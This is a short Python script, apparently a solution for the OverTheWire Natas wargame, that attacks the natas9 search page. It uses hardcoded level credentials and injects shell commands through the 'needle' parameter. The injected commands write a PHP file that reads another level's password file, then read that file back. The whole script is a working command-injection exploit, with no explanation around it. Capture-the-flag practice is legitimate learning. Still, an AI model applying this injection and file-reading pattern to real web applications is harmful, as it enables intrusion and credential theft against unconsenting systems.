#!/usr/bin/env python
# encoding: utf-8

import requests

NATAS_URL='http://natas9.natas.labs.overthewire.org/index.php'
NATAS_USER='natas9'
NATAS_PASS='W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

def _request(cmd):
    params = dict(needle=cmd, submit='Search')
    result = requests.get(NATAS_URL, auth=(NATAS_USER, NATAS_PASS), params=params)
    return result

def upload(code, path):
    print "Upload file to %s ..." % (path)
    print "Code: %s" % (code)
    cmd = "; echo '%s' > %s" % (code, path)
    print "Cmd: %s" % (cmd)
    result = _request(cmd)
    #print result.text
    return result

def verify(path):
    print "Verify ..."
    cmd = "; cat %s #" % (path)
    result = _request(cmd)
    return result

if __name__ == '__main__':
    path = '/tmp/myevi1.code'
    code = """<?php echo @readfile("/etc/natas_webpass/natas26\"); ?>"""
    upload(code, path)
    print verify(path).text


